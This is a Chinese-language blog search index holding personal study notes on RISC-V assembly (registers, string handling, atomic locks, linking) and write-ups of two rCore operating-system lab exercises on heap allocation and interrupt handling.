<strong>Heap</strong>被称为堆，存储程序调用的static型变量；</p><ul><li> Heap是从低地址向高地址增加的；</li><li>堆的第一个地址是保留的reserved，接着是<strong>text segement</strong>（the home of the RISC-V machine code），再往上就是static data segment</li></ul><blockquote><p> C语言中用malloc用free来分配和释放heap空间；<br> C语言这种手动分配和释放空间的机制带来了很多bug，相比JAVA则不会；</p></blockquote><p>最后用一个表格来说明RISC-V寄存器的约定：</p><table><thead><tr><th>Name</th><th>Register number</th><th>Usage</th><th>Presrved on call</th></tr></thead><tbody><tr><td>x0</td><td>0</td><td>The constant value 0</td><td>n.a</td></tr><tr><td>x1(ra)</td><td>1</td><td>Return address(link register)</td><td>yes</td></tr><tr><td>x2(sp)</td><td>2</td><td>Stack pointer</td><td>yes</td></tr><tr><td>x3(gp)</td><td>3</td><td>Global pointer</td><td>yes</td></tr><tr><td>x4(tp)</td><td>4</td><td>Thread pointer</td><td>yes</td></tr><tr><td>x5-x7</td><td>5-7</td><td>Temporaries</td><td>no</td></tr><tr><td>x8-x9</td><td>8-9</td><td>Saved</td><td>yes</td></tr><tr><td>x10-x17</td><td>10-17</td><td>Arguments/results</td><td>no</td></tr><tr><td>x18-x27</td><td>18-27</td><td>Saved</td><td>yes</td></tr><tr><td>x28-x31</td><td>28-31</td><td>Temporaries</td><td>no</td></tr></tbody></table><h3 id="2-9-人机交互"><a href="#2-9-人机交互" class="headerlink" title="2.9 人机交互"></a>2.9 人机交互</h3><p>计算机如何显示呢，通常使用8bit的ASCII码；</p><p>为了方便字符操作，RISC-V提供了两个汇编指令</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lbu x12,0(x10) # 读sb x12,0(x11)  # 写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>lbu: </code>无符号加载数据,将字节加载到目的寄存器的最右端；</p><p> <code>sb:</code>  保存字节,将最右侧的字节存入内存；</p><p><strong>string有3种表示方式：</strong></p><ol><li>string第一个地址保留，给出string长度；- JAVA</li><li>用一个伴随变量来表示string长度；</li><li>最后用一个特殊字符表示string结束； - C</li></ol><p>RISC-V需要使用load/store 半个机器字指令来load和store一个字符；</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lhu x19,0(x10) &#x2F;&#x2F;Read halfword from sourcesh  x10,0(x11)  &#x2F;&#x2F;Write halfword to destination<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-10-RISC-V-对于大立即数和-地址-的处理方法"><a href="#2-10-RISC-V-对于大立即数和-地址-的处理方法" class="headerlink" title="2.10 RISC-V 对于大立即数和 地址 的处理方法"></a>2.10 RISC-V 对于大立即数和 地址 的处理方法</h3><h3 id="2-11-并行-和-指令-：-同步"><a href="#2-11-并行-和-指令-：-同步" class="headerlink" title="2.11 并行 和 指令 ： 同步"></a>2.11 并行 和 指令 ： 同步</h3><p>数据竞争 ： 两个程序 访问同一个数据，一个未写完，一个已经开始读</p><blockquote><p>同步机制通常是由用户级软件例程构建的，这些例程依赖于硬件提供的同步指令</p><p>软件之间通过硬件提供的同步指令来构造同步机制，</p><p>我们专注于 同步中 的 lock unlock ，这对于单处理器很容易执行</p></blockquote><p>我们在多处理器中实现同步所需要的关键能力是一组具有自动读取和修改内存位置能力的硬件原语;</p><p>以atomic exchange/atomic swap为例，它主要完成两个存储之间的数值交换；</p><p> Lock = <strong>0</strong>表示unlock，Lock = <strong>1</strong>则表示lock；</p><p> 从而引出lr.d(读取双保留字)和sc.d(存储有条件的双字)</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">        addi x12,x0,1       &#x2F;&#x2F;copy locked valueagain:  lr.d x10,(x20)      &#x2F;&#x2F;load-reserved to read lock        bne  x10,x0,again   &#x2F;&#x2F;check if it is 0 yet        sc.d x11,x12,(x20)  &#x2F;&#x2F;attempt to store new value        bne  x11,x0,again   &#x2F;&#x2F;branch if store fails        sd x0,0(x20)        &#x2F;&#x2F;free lock by writing 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-12-编译-和-连接-程序"><a href="#2-12-编译-和-连接-程序" class="headerlink" title="2.12 编译 和  连接 程序"></a>2.12 编译 和  连接 程序</h3><p>本节主要讲从磁盘一段C语言文件到计算机可以执行的程序之间的4个步骤：</p><p><img src="https://upload-images.jianshu.io/upload_images/18610675-031b6a1271e0666f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/928/format/webp" alt="img"></p><p><strong>Compiler</strong></p><p>Compiler将高级语言编译为通用的汇编（通用的汇编是因为没有目的器件）</p><p><strong>Assembler</strong></p><p>Assembler就是器件对应的编译器，将通用汇编编译成对应器件支持的汇编；</p><p><strong>Linker</strong></p><p>链接器，将源文件和 库文件，进行链接</p><p><strong>如何做到修改了一行代码而不用重新开始编译；</strong></p><p><strong>Dynamically Linked Libraries</strong></p><p> 传统的link libraries的方法是static方法，有一些缺点：</p><ul><li>The library routines become part of the executable code.木已成舟，再难修改；</li><li>所有的routines都要被load，管你要不要；</li></ul><p>这些缺点导致了DLL(Dynamically linked libraries)的出现；</p><p>DLL,where the library routines are not linked an loaded until the program is run</p><p> <strong>Starting a JAVA Program</strong></p><p> 初步认识一些JVM和JIT吧</p><p><img src="https://upload-images.jianshu.io/upload_images/18610675-cbac66de1d7fe674.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/535/format/webp" alt="img"></p><p>各个平台有不同的JVM，如windows JVM，UNIX JVM等，分别负责将JVM虚拟机最终解</p><p>Windows和Unix instruction；</p>]]></content>
      
      
      
        <tags>
            
            <tag> RISC-V </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验二总结</title>
      <link href="/2020/07/19/%E5%AE%9E%E9%AA%8C%E4%BA%8C/"/>
      <url>/2020/07/19/%E5%AE%9E%E9%AA%8C%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>实验二的分析及解答</p><a id="more"></a><h1 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h1><ol><li>原理：.bss 字段是什么含义？为什么我们要将动态分配的内存（堆）空间放在 .bss 字段？</li></ol><p>放置在此处只是不得以而为之，我们在物理页面分配时需要使用到 Vec，对于操作系统内核我们具有的字段就那么几个，为了让这段空间包含在内核的二进制数据中，放在.bss 中利用了其存放全局变量不会销毁的特性。</p><ol start="2"><li>分析：我们在动态内存分配中实现了一个堆，它允许我们在内核代码中使用动态分配的内存，例如 <code>Vec</code> <code>Box</code> 等。那么，如果我们在实现这个堆的过程中使用 <code>Vec</code> 而不是 <code>[u8]</code>，会出现什么结果？</li></ol><ul><li><p>vec 需要堆分配器为其分配空间</p></li><li><p>堆分配器 需要利用 vec 进行分配</p></li></ul><p>会造成互相依赖，互相调用的死锁。</p><p>实验</p><ol><li><p>回答：<code>algorithm/src/allocator</code> 下有一个 <code>Allocator</code> trait，我们之前用它实现了物理页面分配。这个算法的时间和空间复杂度是什么？</p><p>stacked_Allocator 的时间复杂度 O(1) 空间复杂度 O(n)</p><p>segment_tree_allocator  的时间复杂度 O(n) ， 空间复杂 O(n)</p></li><li><p>二选一：实现基于线段树的物理页面分配算法（不需要考虑合并分配）；或尝试修改 <code>FrameAllocator</code>，令其使用未被分配的页面空间（而不是全局变量）来存放页面使用状态。</p><p>借助给出的代码和自己的理解实现<a href="https://github.com/dingiso/DailySchedule/blob/master/code/%E5%AE%9E%E9%AA%8C%E4%BA%8C/segment_tree_allocator.rs">线段树</a></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> risc-v </tag>
            
            <tag> rCore </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验一总结</title>
      <link href="/2020/07/12/%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
      <url>/2020/07/12/%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>实验一的分析及解答</p><a id="more"></a><h1 id="实验题-for-lab-1"><a href="#实验题-for-lab-1" class="headerlink" title="实验题 for lab-1"></a>实验题 for lab-1</h1><p>主要修改了 <code>entry.asm</code> <code>main.rs</code> <code>handler.rs</code> 将三个文件上传上来</p><p><code>x0</code> 寄存器 默认存储<code>0x0</code> ，可直接无条件跳转即可</p><pre class="line-numbers language-none"><code class="language-none">jr x0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或 使下一条运行的指令为 <code>0x0</code> ，通过改变<code>x1</code>寄存器</p><pre class="line-numbers language-none"><code class="language-none">ld x1 ,(x0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>handle_interrupt 函数增加处理项，处理访问错误地址的情况，如果 <code>stval</code> 值为<strong>0</strong>则打印<code>SUCCESS！</code></p><h3 id="简述题"><a href="#简述题" class="headerlink" title="简述题"></a>简述题</h3><p>1.在 <code>rust_main</code> 函数中，执行 <code>ebreak</code> 命令后至函数结束前，<code>sp</code> 寄存器的值是怎样变化的?</p><p>即分析 <code>interrupt.asm</code> .处理中断过程中,</p><pre class="line-numbers language-none"><code class="language-none">addi sp,sp, -34*8 # 对 sp 减 栈上开辟 Context 所需空间SAVE x1, 1addi x1, sp, 34*8SAVE x1, 2# 先存x1,再利用x1存放原来sp值 , 不动用 x2(sp) 以正确使用 SAVE 宏mv a0 sp# 将 sp 作为参数调用 handle_interruptLOAD    x2, 2# 最后将 sp(x2) 的值恢复<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.回答：如果去掉 <code>rust_main</code> 后的 <code>panic</code> 会发生什么，为什么？</p><pre class="line-numbers language-none"><code class="language-none">0000000080200000 text_start:80200000: 17 61 01 00                   auipc   sp, 2280200004: 13 01 01 59                   addi    sp, sp, 142480200008: 97 10 00 00                   auipc   ra, 18020000c: e7 80 a0 13                   jalr    314(ra)0000000080200014 _ZN4core3ptr24slice_from_raw_parts_mut17h5b8d4c2d17da80d3E:; pub const fn slice_from_raw_parts_mut&lt;T&gt;(data: *mut T, len: usize) -&gt; *mut [T] &#123;80200014: 79 71                         addi    sp, sp, -4880200016: 2a f0                         sd      a0, 32(sp)80200018: 2e f4                         sd      a1, 40(sp);     unsafe &#123; Repr &#123; raw: FatPtr &#123; data, len &#125; &#125;.rust_mut &#125;8020001a: 2a e8                         sd      a0, 16(sp)8020001c: 2e ec                         sd      a1, 24(sp)8020001e: 2a e0                         sd      a0, 0(sp)80200020: 2e e4                         sd      a1, 8(sp); &#125;80200022: 45 61                         addi    sp, sp, 4880200024: 82 80                         ret0000000080200026 _ZN4core3str11unwrap_or_017h6844c978da275184E:; fn unwrap_or_0(opt: Option&lt;&amp;u8&gt;) -&gt; u8 &#123;80200026: 41 11                         addi    sp, sp, -16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到 <code>rust_main</code>后还有许多<code>rust</code>库函数,可能会直接以运行库函数造成不明错误或死循环</p><h3 id="代码-在-实验题1"><a href="#代码-在-实验题1" class="headerlink" title="代码 在 实验题1"></a>代码 在 <a href="https://github.com/dingiso/DailySchedule/tree/master/code/lab-1/%E5%AE%9E%E9%AA%8C%E9%A2%98">实验题1</a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> risc-v </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
